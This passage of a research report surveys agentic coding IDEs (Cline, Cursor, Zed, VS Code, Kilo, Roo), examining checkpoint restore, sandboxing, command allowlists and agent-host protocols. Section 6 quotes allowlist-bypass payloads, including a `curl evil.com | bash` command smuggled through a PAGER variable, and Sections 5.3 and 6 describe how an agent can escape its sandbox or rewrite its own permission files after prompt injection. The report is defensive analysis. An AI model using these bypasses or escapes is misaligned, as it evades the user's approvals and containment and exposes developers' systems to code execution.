The VS Code extension uses a shadow Git repository: *"After each tool use… Cline commits the current
state of your files to this shadow repo. Your main Git repository stays untouched."* Restore offers
three options — Restore Files, Restore Task Only, Restore Files & Task.

The SDK/CLI path is more aggressive and worth reading. `sdk/packages/core/src/session/checkpoint-restore.ts`
opens a *worktree restore transaction* whose doc comment reads:

> *"`git stash create` omits untracked files, but checkpoint restoration runs `git clean -fd`. Use a
> short-lived `stash push --include-untracked`, move its object behind a private ref, and immediately
> remove it from the user's visible stash list."*

So the CLI restore path does `git reset --hard` plus `git clean -fd` **on the developer's own
repository**, taking a private stash first as an undo. `git clean -fd` (no `-x`) removes untracked
non-ignored files; ignored files survive. And `sdk/packages/core/src/hooks/checkpoint-hooks.ts` builds
its capture from *"only the current untracked (but not git-ignored) files"* via
`git ls-files --others --exclude-standard`.

Cline is therefore the mirror image of Zed: Zed's restore leaves agent-created files behind; Cline's CLI
restore deletes untracked files, which will include anything the developer created by hand during the
session and had not yet committed. Both behaviours are defensible; neither is what "checkpoint" implies.

### 4.4 Cursor

*"Checkpoints… record the state of all modified files"*, are *"stored locally and separate from Git"*,
and *"Restoring a checkpoint reverts files only; it does not remove messages from the conversation."*
The guidance is explicit that they are not version control: *"Only use them for undoing Agent changes;
use Git for permanent version control."*

### 4.5 The common gap

Across all four implementations:

| Restored | Not restored |
|---|---|
| Tracked file contents in the workspace | Anything matched by `.gitignore` — including `.env`, `dist/`, local databases |
| Untracked non-ignored files (product-dependent) | Files over 2 MB and binaries/media/DBs (Zed) |
| — | Files created by the agent (Zed) |
| — | Anything outside the workspace root |
| — | **Terminal side effects**: installed packages, changed global config, killed processes, modified system state |
| — | **Database state**: migrations run, rows written |
| — | **Network calls**: API writes, webhooks, published artefacts, `git push` |
| — | Checkpoints older than the GC window (Kilo, 7 days) |

Cline's claim that *"the cost of a mistake drops to nearly zero"* is true for the first column and false
for the second. The second column is where the irreversible mistakes live. No product in the region
claims otherwise in its reference documentation; the claim appears in the workflow prose.

---

## 5. Containment: naming the mechanism precisely

### 5.1 What each product actually runs

| Product | Mechanism | Default | Platforms |
|---|---|---|---|
| VS Code / Copilot | `@vscode/sandbox-runtime` — OS-level isolation, *"strict file system and network boundaries at the kernel level"* | `chat.agent.sandbox.enabled: "off"` | *"macOS and Linux, including WSL2"*. Not native Windows |
| Cursor | macOS Seatbelt via `sandbox-exec`; Linux **Landlock v3**, kernel ≥ 6.2, unprivileged user namespaces (AppArmor setup may be needed) | On for shell commands in Auto-review; optional in Allowlist; off in Run Everything | macOS, Linux. No Windows/WSL support documented |
| Zed | `bwrap` (Bubblewrap) on Linux; WSL on Windows; no extra requirement on macOS | Opt-in per request; padlock indicator in the thread | All platforms *"in some form"*; *"sandboxes on Windows are weaker"* |
| Cline | none | — | — |
| Kilo Code | none | — | — |
| JetBrains Junie | none (`.aiignore` is a content filter, not containment) | — | — |
| Windsurf / Devin Desktop | none documented on the pages read | — | — |

### 5.2 What the sandboxes actually confine

**VS Code**: *"Read access is allowed for workspace folders and the sandbox runtime temp folder.
Reads from your home directory (`$HOME`) are denied by default to protect sensitive files. Write access
is limited to the current working directory and its subdirectories."* With `chat.agent.sandbox.allowNetwork:
false` (the default) plus `chat.agent.networkFilter` / `allowedNetworkDomains` / `deniedNetworkDomains`,
outbound connections are *"blocked by default unless you explicitly allow specific domains."* Sandboxed
processes *"cannot access resources outside the permitted scope, even if they are approved"* — the one
place in the region where containment genuinely outranks approval. MCP servers can be sandboxed too, and
*"tool calls from sandboxed servers are auto-approved because they run in a controlled environment."*

**Cursor**: `sandbox.json` defaults filesystem access to `"workspace_readwrite"`, with a set of paths
write-protected *regardless of configuration*: `.cursor/*.json`, `.cursor/**/*.json`,
`.cursor/.workspace-trusted`, `.claude` metadata, `.vscode/`, `.git/hooks/`, `.git/config`,
`.cursorignore`. Writable `.cursor` subdirectories are limited to `rules/, commands/, worktrees/,
skills/, agents/`. Network is `"default": "deny"` with an allowlist supporting exact domains, wildcards
and CIDR; **always blocked** are RFC 1918 ranges, IPv6 private ranges, and the cloud metadata endpoint
`169.254.169.254`. Roughly 70 package-registry and VCS domains are allowed by default.

**Zed**: sandboxing applies to `terminal` and `fetch` only. Defaults: reads across most of the
filesystem including `.git` metadata; writes inside open project directories except `.git`; a writable
temp location; all other writes blocked; outbound network blocked pending a host-specific or
unrestricted grant (*"host-specific enforcement is not available on every platform"*); Unix-domain
sockets blocked so the agent cannot reach a container daemon or session bus to escape.

### 5.3 Zed's threat model is the most complete, and it is a warning

Zed's sandboxing page states what the sandbox does not cover and gives three concrete escapes:

> *"An agent may add a malicious Rust procedural macro to your codebase, which will be automatically
> executed by `rust-analyzer` **outside the sandbox**."*
>
> *"An agent may modify a `Makefile` to inject a malicious script, which is executed **outside the
> sandbox** when you next run `make` in the built-in terminal."*
>
> *"The agent cannot write to your repository's protected `.git` directory, but it can create a
> submodule under your project whose Git metadata (including config such as `core.fsmonitor`) it fully
> controls. That metadata may then be executed **outside the sandbox** when you subsequently run Git
> commands in a regular terminal. Your shell prompt may even execute Git commands every time it
> renders!"*

It further states that sandboxing *"has no effect on"* language servers, the built-in git client, the
regular terminal, extensions, external agents, or terminal threads — and, on trust: *"Sandboxing also
only applies the restrictions that the user requested. If an agent requests write access to your home
directory, sandboxing will not (and should not!) do anything to prevent an agent adding a malicious key
to `$HOME/.ssh`."*

This is the honest statement of the region's containment ceiling. **An agent with write access to a
project directory that a developer subsequently builds, opens, or runs Git against has code execution
outside any sandbox the editor can impose**, because the developer's own toolchain executes
repository-controlled configuration. JetBrains reaches the same conclusion from the other direction with
its `Edit build scripts` rule type.

### 5.4 The sandboxes themselves are new attack surface

Cursor published six sandbox-escape advisories between 2026-02-13 and 2026-07-14, two rated critical:

| Date | CVE | Summary |
|---|---|---|
| 2026-02-13 | CVE-2026-26268 | Sandbox escape via Git hooks |
| 2026-05-21 | CVE-2026-48124 | Sandbox escape via Claude hook configuration |
| 2026-06-05 | CVE-2026-50548 (**critical**) | *"Cursor runs agent terminal commands in a sandbox by default, and the sandbox grants write access to the command's working directory. A flaw was identified in how the agent could modify the `working_directory` parameter"* — enabling overwriting the `cursorsandbox` helper *"so later commands run unsandboxed — with no user interaction beyond a benign prompt."* Fixed in Cursor 3.0 |
| 2026-06-05 | CVE-2026-50549 (**critical**) | Sandbox escape via symlink and failed path canonicalisation |
| 2026-07-06 | CVE-2026-61613 | Cloud Agent browser sandbox escape |
| 2026-07-14 | CVE-2026-73217 / CVE-2026-73218 | Escape via tampered Python virtual environments; via launching privileged containers |

VS Code's network filter was likewise bypassable: **CVE-2026-69306** (2026-08-12), *"The URL authority
matcher did not handle bracketed IPv6 literals and treated normalization failures as allowed"*, letting
an IPv4-mapped IPv6 URL reach local HTTP services *"despite deny-all or allowlist network policies."*
Fixed in 1.132.1.

*Evidence tier for §5.4: vendor security advisories published by the affected vendor.*

---

## 6. The allowlist is not a security boundary

This is the strongest cross-product finding in the strand, and it is supported entirely by the vendors'
own advisories.

| Date | Product | CVE | Bypass technique |
|---|---|---|---|
| 2025-08-22 | Roo Code | CVE-2025-57771 | *"process substitution and the single ampersand were not handled correctly in the command parsing logic"* — with `ls` auto-approved, arbitrary commands ride along |
| 2025-09-04 | Roo Code | CVE-2025-58370 | Bash parameter expansion and indirect reference |
| 2025-09-04 | Roo Code | CVE-2025-58374 | **`npm install` shipped in the default auto-approve allowlist**; a malicious `postinstall` in a repository's `package.json` therefore executed on open. Fixed by *"removing dangerous commands from the default auto-approve allowlist as well as removing these previously default commands from the allowlist when the extension is updated"* |
| 2025-11-21 | Roo Code | CVE-2025-65946 | RCE via a zsh command-validation bug |
| 2026-01-14 | Cursor | CVE-2026-22708 | *"certain shell built-ins can still be executed without appearing in the allowlist and without requiring user approval… poison the shell environment by setting, modifying, or removing environment variables that influence trusted commands"* |
| 2026-03-09 | Cursor | CVE-2026-31854 | Arbitrary code execution via prompt injection and allowlist bypass |
| 2026-05-08 | Zed | CVE-2026-44463 | `PAGER=curl git diff` matches `^git\b` and executes `curl`; *"a more dangerous variant: `PAGER="curl evil.com \| bash" git diff`"* |
| 2026-05-08 | Zed | CVE-2026-44466 | `echo $(($(curl -s https://google.com \| wc -l)))` passes an `^echo\b` allow rule |
| 2026-05-08 | Zed | CVE-2026-44462 | `echo ${one="$"}${two="$one(curl google.com)"}${two@P}` passes `^echo\b` on Linux |
| 2026-06-09 | VS Code | CVE-2026-45482 | The redirection guard handled `~` but not Windows `%APPDATA%`, so `> %APPDATA%\file.txt` could be auto-approved |

The corrective pattern is identical everywhere and worth stating as a design rule: **an allowlist over a
shell must be enforced on a parsed command tree, not a string, and must reject shell substitution
outright.** Zed now parses with `brush-parser` and rejects `$VAR`, `${VAR}`, `$(...)`, backticks,
`$((...))`, `<(...)`, `>(...)` in permission-protected commands, denying when parsing fails. VS Code
evaluates its rules *"for every sub-command within the full command line"* and detects inline commands
such as `<(foo)`. JetBrains teaches users to write `[^\s;&|<>@$]+` by hand. Kilo checks each parsed
command in a chain and *"a single denied command rejects the request."*

Three secondary observations:

- **The three-way disagreement about `npm install` is instructive.** Roo shipped it as a default allow
  and got a CVE; VS Code allows only `npm ci` and `--frozen-lockfile` variants, *"since we trust the
  workspace and lock file is trusted"*; VS Code separately auto-approves any `package.json`-defined
  script by default. The same command is a vulnerability in one product and a convenience default in
  another, and the difference is entirely the workspace-trust argument.
- **Config-write escalation is its own class.** Cursor CVE-2025-54135 (2025-08-05, CVSS 8.5): *"if
  sensitive MCP files, such as the `.cursor/mcp.json` file don't already exist in the workspace, an
  attacker can chain a indirect prompt injection vulnerability to hijack the context to write to the
  settings file and trigger RCE on the victim without user approval."* Roo CVE-2025-53536 (2025-07-07):
  RCE via `.vscode/settings.json`. Copilot/Visual Studio CVE-2025-53773 (2025-08-12, CVSS 7.8): command
  injection allowing local code execution, publicly analysed as an agent writing its own auto-approve
  setting. **The agent can escalate its own permissions by editing the file that grants them** — which
  is why Cursor now hard-protects `.cursor/*.json`, `.vscode/`, `.git/hooks/`, `.git/config` and
  `.cursorignore` from sandboxed writes regardless of configuration, and why Junie treats
  *"configuration and hidden files"* as a distinct sensitive class.
- **The `.env` question is answered differently everywhere.** Kilo and Junie prompt for `.env` reads even
  under allow-everything. Zed, Cline and Windsurf have no equivalent rule. Cursor has a "sensitive file"
  concept that has itself been bypassed three times (CVE-2025-59944, CVE-2025-61593, CVE-2025-64107 —
  the last via *"path manipulation using backslashes on Windows"*).

---

## 7. Structural limits: what agentic IDE modes cannot do

1. **Survive the editor closing — mostly.** The historical answer was no. VS Code changed it: agents run
   in a separate **Agent Host** process addressed over the Agent Host Protocol, and *"Agent sessions are
   not tied to the lifetime of the window for their workspace. You can close the window and reopen the
   session later from another window… While the Agent Host remains running, an active turn can continue
   without a connected client."* This is the boundary of the region eroding: the editor is becoming a
   client of a persistent agent process rather than its container.

2. **Run without a human present.** No product in this region schedules or triggers itself. Every session
   starts from a human prompt in a window. Where autonomy without a human is offered, it is a *different
   product*: Cursor's cloud agents, Roo's Roomote, Junie's headless mode and GitHub Action, Kilo's Agent
   Manager. The IDE mode is now often a *launcher* for those — Cursor's Agents window lets you *"move an
   agent from cloud to local to iterate quickly, and move it back to the cloud so it keeps working on its
   own"* — which makes the boundary between this region and the asynchronous region a UI affordance
   rather than an architectural line.

3. **Open a pull request, natively.** None of the built-in tool sets includes a PR tool. Agents reach
   PRs through the terminal (`gh`, `git push`) or through an MCP server — Kilo's own permission
   documentation uses `github_create_pull_request` as its worked MCP example. So the answer is "yes, if
   you let the shell or an MCP server do it", and Cline's YOLO documentation lists *"Commit and push
   changes to version control"* among the things that will happen. Cursor's Agents window adds a diffs
   view to *"review and commit changes, and manage PRs without leaving Cursor"* — the human still drives
   the PR.

4. **Merge.** Nothing found in any product's documentation or tool schema performs a merge to a protected
   branch as a first-class capability. As with PRs, a shell with credentials can do it; nothing offers it
   as a tool. This is the practical end of the region's reach.

5. **Bound its own blast radius outside the workspace, without a sandbox.** Cline, Kilo and Junie run in
   the developer's own shell with the developer's own privileges and credentials. Cline's default
   `editFilesExternally: true` and Junie's `Read outside project` / `Write outside project` rule types
   are explicit acknowledgements that the workspace root is a convention, not a boundary.

6. **Contain a foreign agent it is hosting.** See §8.3.

---

## 8. The category is unstable — three exits in twelve months

### 8.1 Roo Code archived; the team moved to a cloud agent

`RooCodeInc/Roo-Code` has `"archived": true` (GitHub API, read 2026-08-30). Final release **v3.54.0,
2026-05-15**. The last commits on `main`, same day: *"Redirect roocode.com to roomote.dev"* (#12374) and
*"Remove roocode.com web app"* (#12375). The organisation's active repository is `RooCodeInc/Roomote`
(pushed 2026-08-30), whose README opens:

> *"A cloud coding agent you deploy in minutes and actually own. You give it a task in Slack (or Teams,
> or Telegram, or Discord). It clones your repo into an isolated sandbox, writes the code, runs the
> tests, takes a screenshot, and opens a PR. You review the diff like you would from any teammate. **No
> IDE plugin. No terminal session. No babysitting.** It works while you do something else, all the
> way."*

One of the three leading open-source agentic IDE extensions did not evolve within this region; it left
it, and the replacement is defined by negation of everything this region is. That is the single most
consequential datum in the strand for a spectrum document, and it is a *directional* claim about one
team, not evidence that the region is shrinking — Kilo Code (27k stars) and Cline are both active.

### 8.2 Windsurf became Devin Desktop; Amazon Q Developer IDE plugins are scheduled for retirement

`docs.windsurf.com` 307-redirects to `docs.devin.ai/desktop/`; documentation refers to the product as
Devin Desktop throughout while retaining Cascade as the agent name and `windsurf` in legacy paths.
AWS's user guide carries the end-of-support notice for Amazon Q Developer IDE plugins dated **30 April
2027**, pointing to Kiro. Of the eight representatives scoped for this strand, three (Roo, Windsurf,
Amazon Q) are no longer independently what they were twelve months ago.

### 8.3 The genuinely new architecture: the editor as agent host

Two protocols, developed independently, now let an editor host an agent harness it did not build.

**Agent Client Protocol (ACP)** — repository `agentclientprotocol/agent-client-protocol` (moved from
`zed-industries`), Apache-2.0, created 2025-06-23, 4,114 stars, `v1.7.0` released 2026-08-20 with
`schema-v2.0.0-alpha.3` in draft. Its stated problem: *"Every new agent-editor combination requires
custom work"* and *"Agents work with only a subset of available editors"*, modelled explicitly on LSP.

**VS Code Agent Host Protocol (AHP)** — *"VS Code runs AI coding agents in a dedicated process called
the Agent Host, which it communicates with through the Agent Host Protocol (AHP),"* with adapters for
Copilot, Claude and Codex.

Zed's ACP registry lists Claude, Codex, OpenCode, Copilot, Cursor and Pi Coding Agent as installable
external agents. Devin Desktop documents `/desktop/acp` and `/desktop/acp-custom`. Kilo's vendored
opencode contains `src/acp/permission.ts`. The protocol is becoming the interoperability layer for the
region.

**Its permission model relocates the decision.** In the ACP v1 JSON Schema, `RequestPermissionRequest`
carries `x-side: "client"` and `x-method: "session/request_permission"` — the **agent** calls the
**editor** to ask. `PermissionOptionKind` is `allow_once | allow_always | reject_once | reject_always`.
The agent supplies the option list and decides which operations warrant a request at all. The v2 RFD
extends this beyond tool calls to a tagged `subject` union, with a `command` subject carrying `command`
and an absolute `cwd`, noting the request *"never asks the Client to execute it."*

The consequence is stated directly by Zed: External Agents *"usually own their own runtime, auth, model
selection, tools, and native configuration"*, and sandboxing *"applies only to Zed Agent. It does not
sandbox … External Agents."* **A developer who has carefully configured `agent.tool_permissions` in Zed
and then runs Claude Code or Codex as an ACP external agent in the same panel is governed by that
agent's permission model, not Zed's, and is outside Zed's sandbox.** The same holds for third-party
agent harnesses under VS Code's Agent Host. The editor's approval UI looks identical in both cases.

### 8.4 What is converging

Against that churn, four things have standardised across the region as of 2026-08-30:

- **`AGENTS.md`** is read by VS Code (`chat.useAgentsMdFile`), Cursor (*"an alternative to
  `.cursor/rules`"*), Devin Desktop (*"fed into the same Rules engine"*), and Kilo. VS Code additionally
  reads `CLAUDE.md` via `chat.useClaudeMdFile`. Nested subdirectory `AGENTS.md` is supported by Cursor
  and experimentally by VS Code.
- **MCP** is the universal third-party tool surface, and universally the least granular permission
  surface — Junie cannot scope MCP approval below "all tools", and Cursor documents MCP tool calls as
  always requiring approval.
- **Three-valued permissions** — allow / ask / deny — are now the shared vocabulary (Zed, Kilo, VS Code's
  auto-approve maps, ACP's option kinds).
- **Git worktree isolation for parallel agents** appears in Cursor (Agents window), Zed (Parallel
  Agents), Kilo (Agent Manager, with per-worktree snapshot repositories) and Devin Desktop
  (`/desktop/cascade/worktrees`).

---

## 9. Sources

All URLs retrieved 2026-08-30 unless stated. Repository files were read from `main` on 2026-08-30.

**Source code (highest trust)**

- Zed permission engine — https://github.com/zed-industries/zed/blob/main/crates/agent/src/tool_permissions.rs
- Zed checkpoint capture/restore — https://github.com/zed-industries/zed/blob/main/crates/git/src/repository.rs
- Zed checkpoint exclusions — https://github.com/zed-industries/zed/blob/main/crates/git/src/checkpoint.gitignore
- Zed docs (in-repo) — `docs/src/ai/tool-permissions.md`, `docs/src/ai/sandboxing.md`,
  `docs/src/ai/external-agents.md`, `docs/src/ai/parallel-agents.md`
- VS Code terminal auto-approve defaults — https://github.com/microsoft/vscode/blob/main/src/vs/workbench/contrib/terminalContrib/chatAgentTools/common/terminalChatAgentToolsConfiguration.ts
- VS Code permission warnings — https://github.com/microsoft/vscode/blob/main/src/vs/workbench/contrib/chat/common/chatPermissionWarnings.ts
- VS Code sandbox runtime types — `src/vs/platform/sandbox/common/terminalSandbox.ts`
- Cline auto-approval defaults — https://github.com/cline/cline/blob/main/apps/vscode/src/shared/AutoApprovalSettings.ts
  (commits `923ee3e1` 2026-06-25, `9abd7ae8` 2026-06-26)
- Cline checkpoint restore / hooks — `sdk/packages/core/src/session/checkpoint-restore.ts`,
  `sdk/packages/core/src/hooks/checkpoint-hooks.ts`
- Cline docs (in-repo) — `docs/features/auto-approve.mdx`, `docs/core-workflows/checkpoints.mdx`,
  `docs/enterprise-solutions/.../yolo-mode.mdx`
- Kilo Code default permissions — https://github.com/Kilo-Org/kilocode/blob/main/packages/opencode/src/agent/agent.ts
  and `packages/opencode/src/kilocode/agent/index.ts`
- Kilo Code allow-everything — `packages/opencode/src/kilocode/permission/allow-everything.ts`
- Kilo Code docs (in-repo) — `packages/kilo-docs/pages/customize/agent-permissions.md`,
  `.../getting-started/settings/auto-approving-actions.md`, `.../code-with-ai/features/checkpoints.md`
- ACP JSON Schema v1 — https://github.com/agentclientprotocol/agent-client-protocol/blob/main/schema/v1/schema.json
- ACP v2 permission RFD — `docs/rfds/v2/permission-requests.mdx`
- Roomote README — https://github.com/RooCodeInc/Roomote/blob/main/README.md

**Vendor documentation**

- VS Code approvals — https://code.visualstudio.com/docs/agents/run/approvals
- VS Code agent security — https://code.visualstudio.com/docs/agents/run/security
- VS Code trust and safety — https://code.visualstudio.com/docs/agents/concepts/trust-and-safety
- VS Code agent host — https://code.visualstudio.com/docs/agents/concepts/agent-host
- VS Code custom instructions (page dated 2026-08-26) — https://code.visualstudio.com/docs/agent-customization/custom-instructions
- VS Code Copilot security overview — https://code.visualstudio.com/docs/copilot/security
- Cursor run modes — https://cursor.com/docs/agent/security/run-modes
- Cursor agent security — https://cursor.com/docs/agent/security
- Cursor sandbox reference — https://cursor.com/docs/reference/sandbox
- Cursor permissions reference — https://cursor.com/docs/reference/permissions
- Cursor checkpoints — https://cursor.com/docs/agent/chat/checkpoints
- Cursor agents window — https://cursor.com/docs/agent/agents-window
- Cursor rules / AGENTS.md — https://cursor.com/docs/context/rules
- Devin Desktop (ex-Windsurf) terminal — https://docs.devin.ai/desktop/terminal
- Devin Desktop Cascade modes — https://docs.devin.ai/desktop/cascade/modes
- Devin Desktop AGENTS.md — https://docs.devin.ai/desktop/cascade/agents-md
- Devin Desktop enterprise policies — https://docs.devin.ai/desktop/enterprise-policies
- Junie IDE plugin (page dated 2026-08-28) — https://junie.jetbrains.com/docs/junie-ide-plugin.html
- Junie Action Allowlist (page dated 2026-08-28) — https://junie.jetbrains.com/docs/action-allowlist.html
- Amazon Q Developer overview — https://docs.aws.amazon.com/amazonq/latest/qdeveloper-ug/what-is.html
- Amazon Q Developer IDE plugins end of support — https://docs.aws.amazon.com/amazonq/latest/qdeveloper-ug/q-developer-ide-end-of-support.html
- ACP introduction — https://agentclientprotocol.com/overview/introduction

**Security advisories** (vendor-published; retrieved via the GitHub Security Advisories API and NVD)

- Zed: GHSA-c3g6-c3ff-69cg / CVE-2026-44463; GHSA-rqq3-p6x4-q866 / CVE-2026-44462;
  GHSA-c99f-97vf-4h5h / CVE-2026-44466 (all 2026-05-08); GHSA-x34m-39xw-g2wr / CVE-2025-55012 (2025-08-11)
- Cursor: GHSA-82wg-qcm4-fp2w / CVE-2026-22708 (2026-01-14); GHSA-3p48-7v9f-v5cw / CVE-2026-50548 and
  GHSA-3v8f-48vw-3mjx / CVE-2026-50549 (2026-06-05); GHSA-8pcm-8jpx-hv8r / CVE-2026-26268 (2026-02-13);
  GHSA-pc9j-3qc2-95wv / CVE-2026-48124 (2026-05-21); GHSA-whx2-4gvm-m3r3 / CVE-2026-61613 (2026-07-06);
  GHSA-p9g2-cr55-cw9c and GHSA-v4xv-rqh3-w9mc (2026-07-14); GHSA-hf2x-r83r-qw5q / CVE-2026-31854
  (2026-03-09); CVE-2025-54135 and CVE-2025-54136 (NVD, 2025-08)
- Roo Code: GHSA-wrh9-463x-7wvv / CVE-2025-57771 (2025-08-22); GHSA-c292-qxq4-4p2v / CVE-2025-58374,
  GHSA-2rm5-cvcm-7592 / CVE-2025-58370 (2025-09-04); GHSA-hwm7-w97p-4h8p / CVE-2025-65946 (2025-11-21);
  GHSA-3765-5vjr-qjgm / CVE-2025-53536 (2025-07-07)
- VS Code: GHSA-6xp2-9cj3-f488 / CVE-2026-69306 (2026-08-12); GHSA-c82g-9gj4-hxp2 / CVE-2026-45482
  (2026-06-09)
- GitHub Copilot / Visual Studio: CVE-2025-53773 (NVD, 2025-08-12)

**Repository metadata** (GitHub REST API, read 2026-08-30): `RooCodeInc/Roo-Code` archived flag and
release history; `RooCodeInc` organisation repository list; `Kilo-Org/kilocode`, `cline/cline`,
`zed-industries/zed`, `continuedev/continue`, `agentclientprotocol/agent-client-protocol` metadata.

---

## 10. Confidence and gaps

**High confidence.** Anything read from source code: Zed's five hardcoded rules and its restore
implementation; VS Code's default allow/deny sets and permission-level warning text; Cline's default
settings object and its commit history; Kilo's baseline permission config and bash patch; the ACP schema.
These are verifiable by re-reading the named files. The CVE record is likewise high confidence — vendor-
published, with reproduction steps.

**Medium confidence.**

- **Cline's effective default.** `DEFAULT_AUTO_APPROVAL_SETTINGS` and the documented semantics of the
  base/extension toggles were read; the consuming code path was not traced end to end, and a first-run
  onboarding flow that overrides the defaults cannot be excluded. The claim "file edits anywhere are
  auto-approved out of the box" follows from the shipped object plus the vendor's own documented
  semantics, not from an observed run.
- **Windsurf/Devin Desktop.** Documented from the migrated docs site only; no source access. The absence
  of an enterprise policy limiting Turbo means "not documented on the pages read", not "does not exist".
- **Amazon Q Developer.** Only the end-of-support and overview pages were read. Whatever agentic approval
  model the current plugins carry is not characterised here, and Kiro was not investigated — it is a
  distinct product and belongs in a later pass.

**Explicit gaps.**

1. **Cursor's three protections under Run Everything is unresolved.** The docs say they *"can require
   approval even when a mode would otherwise run automatically"* and separately that Run Everything runs
   *"every tool call"* automatically. Whether Browser/File-Deletion/External-File Protection are
   user-toggleable settings, and whether they survive Run Everything, is not stated on the pages read.
   This is the single most important unresolved question in §3 and should be settled by inspecting a
   Cursor installation's settings surface.
2. **No adoption data.** Nothing was found quantifying how many developers enable Bypass Approvals,
   Turbo, Brave Mode or YOLO, or for how long. Every vendor holds this telemetry (Cline's enterprise docs
   describe capturing *"when users toggle YOLO Mode on/off"*), and none publishes it. **All autonomy
   claims in this document are about what the software permits, not about what developers do.** The
   project's existing figures on permission-prompt approval rates come from a different vendor's
   telemetry and are not re-derived here.
3. **No controlled study** of whether checkpoint-backed auto-approval produces better or worse outcomes
   than diff-by-diff review. The vendor claim (Cline: *"the cost of a mistake drops to nearly zero"*) is
   a vendor claim, and §4 gives structural reasons to doubt its scope. *Evidence tier: none exists in
   this corpus.*
4. **Continue** (`continuedev/continue`, 35,705 stars, last push 2026-08-30, self-described *"open-source
   coding agent"*) was confirmed active but its permission model was not read. It is a candidate for a
   follow-up.
5. **Kiro**, **Google Antigravity**, **Trae**, and JetBrains **AI Assistant's** non-Junie agent surface
   were out of the sources gathered. The JetBrains AI Assistant help page URL 404'd; Junie's own docs
   were used instead, and they now describe AI Chat as the recommended in-IDE surface.
6. **VS Code's `chat.tools.eligibleForAutoApproval` interaction with Bypass Approvals** was read from
   documentation, not source; whether setting it `false` genuinely defeats Bypass Approvals for that tool
   is unverified.
7. **Cline and Kilo VS Code checkpoint code** was read only for the SDK/CLI paths and the documented
   architecture; the extension-side shadow-repository implementation was located but not read line by
   line.

---

## 11. Blocked or unavailable sources

No block was circumvented. All of the following were 404s, redirects or JS-rendered shells encountered
in the course of the research; where an alternative existed it was used and is cited above.

| URL | Result | Substitute used |
|---|---|---|
| https://cursor.com/docs/configuration/settings | HTTP 404 | `cursor.com/docs/reference/permissions`, `.../reference/sandbox`, `.../agent/security/run-modes` |
| https://cursor.com/docs/agent/sandboxing | HTTP 404 | `cursor.com/docs/reference/sandbox` |
| https://cursor.com/docs/agent/run-modes/sandboxing | HTTP 404 | as above |
| https://code.visualstudio.com/docs/agents/agent-sandbox | HTTP 404 | `docs/agents/run/security`, `docs/agents/run/approvals` |
| https://code.visualstudio.com/docs/agents/run/terminal-auto-approve | HTTP 404 | VS Code source (`terminalChatAgentToolsConfiguration.ts`) — strictly better |
| https://docs.windsurf.com/windsurf/cascade/cascade | 307 → docs.devin.ai | Followed the redirect; recorded as a finding |
| https://www.jetbrains.com/help/junie/get-started-with-junie.html | 301 → junie.jetbrains.com/docs/ | Followed |
| https://junie.jetbrains.com/docs/ (and `/get-started-with-junie.html`) | JS shell, 4.5 KB, no body content | Fetched sibling pages whose HTML carries body content: `action-allowlist.html`, `junie-ide-plugin.html` |
| https://www.jetbrains.com/help/idea/ai-agents.html | HTTP 404 | Junie docs |
| https://junie.jetbrains.com/docs/introduction | HTTP 404 | Junie docs TOC (`HelpTOC.json`) |
| https://zed.dev/docs/ai/agent-panel, /tool-permissions | Rendered, partial | Repository `docs/src/ai/*.md` read instead — authoritative |
| https://docs.aws.amazon.com/amazonq/latest/qdeveloper-ug/software-dev.html | Empty body returned | `what-is.html` and `q-developer-ide-end-of-support.html` |
| GitHub `/advisories?keyword=…` | Keyword parameter ignored; returned unfiltered latest | Per-repository `/repos/{owner}/{repo}/security-advisories` used instead |

`Kilo-Org/kilocode` returns an **empty** published-advisory list. That is an absence of published
advisories, not evidence of absence of vulnerabilities, and is not written as such anywhere above.
